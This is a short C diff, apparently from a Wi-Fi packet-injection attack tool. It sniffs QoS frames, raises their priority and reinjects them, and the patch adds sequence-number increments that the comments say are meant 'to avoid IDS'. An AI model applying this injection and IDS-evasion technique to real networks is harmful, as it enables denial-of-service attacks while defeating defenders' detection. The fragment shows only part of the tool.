@@ -112,7 +112,8 @@ struct packet countermeasures_getpacket(void *options) {
     if (sniffed.data) {	//We got a packet, that has to be sent again a few times :)
 
       sniffed.data[QOS_PACKET_PRIO_POS]++;
-
+      increase_seqno(&sniffed);  //Increase sequence counter to avoid IDS
+      
       pkt.len = sniffed.len;
       pkt.data = malloc(pkt.len);
       memcpy(pkt.data, sniffed.data, pkt.len);
@@ -146,6 +147,7 @@ struct packet countermeasures_getpacket(void *options) {
       printf(" with priority %d captured and reinjected.\n", sniffed.data[QOS_PACKET_PRIO_POS] & 0x07);
 
       sniffed.data[QOS_PACKET_PRIO_POS] &= 0xF8;  //Reset QoS queue to 0
+      increase_seqno(&sniffed);  //Increase sequence counter to avoid IDS
 
       pkt.len = sniffed.len;
       pkt.data = malloc(pkt.len);
